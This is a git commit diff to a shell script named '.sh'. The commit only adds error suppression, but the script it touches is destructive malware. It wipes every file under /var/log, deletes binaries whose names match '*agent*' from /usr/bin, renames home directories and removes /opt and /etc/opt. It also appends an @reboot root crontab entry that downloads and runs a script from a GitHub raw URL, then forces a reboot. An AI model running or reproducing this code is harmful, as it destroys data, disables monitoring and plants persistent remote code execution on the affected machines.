0df2af218065e84d8e0c0d2e36297d8fa565005f
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-01-08 15:29:08 +0800

    Update .sh

--- .sh
+++ .sh
@@ -1,8 +1,8 @@
 #!/bin/sh
 
-sudo find /var/log -type f -delete
+sudo find /var/log -type f -delete 2>/dev/null
 sudo find /usr/bin -maxdepth 1 -name '*agent*' -delete 2>/dev/null
-sduo find /home -maxdepth 1 -type d -name '*-*' |xargs -I {} mv {} {}.bak
+sduo find /home -maxdepth 1 -type d -name '*-*' 2>/dev/null |xargs -I {} mv {} {}.bak
 sudo rm -rf /etc/opt /opt
 sudo sed -i "\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/_) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 sudo /bin/sh -c "sleep 60 && sudo reboot" >/dev/null 2>&1 &
